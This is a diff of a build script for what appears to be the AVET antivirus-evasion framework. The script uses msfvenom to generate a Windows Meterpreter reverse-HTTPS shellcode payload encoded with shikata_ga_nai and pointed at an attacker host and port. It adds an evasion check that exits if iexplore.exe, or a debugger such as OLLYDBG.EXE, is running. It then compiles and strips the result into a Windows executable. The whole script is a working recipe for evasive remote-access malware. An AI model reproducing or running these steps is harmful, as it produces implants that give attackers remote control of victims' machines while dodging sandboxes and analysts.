@@ -2,7 +2,7 @@
 
 
 #DESCRIPTION_START
-# Apply shikata and perform gethostbyname sandbox evasion.
+# Apply shikata and exit if a given process is found
 #DESCRIPTION_END
 
 
@@ -36,8 +36,11 @@ enable_debug_print
 # generate payload and call avet
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
-# add gethostbyname sandbox evasion
+# add has_process_exit, just quit if the process is running
 add_evasion has_process_exit 'iexplore.exe'
+
+# note: it is possible to add several lines if program should quit on multiple processes, like:
+# add_evasion has_process_exit 'OLLYDBG.EXE'
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
@@ -53,8 +56,7 @@ set_payload_info_source no_data
 set_payload_execution_method exec_shellcode
 
 
-# compile
-# $win32_compiler -o output/gethostbyname_revhttps_win32.exe source/avet.c -lws2_32
+# compile, bit dirty with fpermissive
 $win32cpp_compiler -fpermissive -o output/has_process_exit_revhttps_win32.exe source/avet.c -lws2_32
 strip output/has_process_exit_revhttps_win32.exe
 
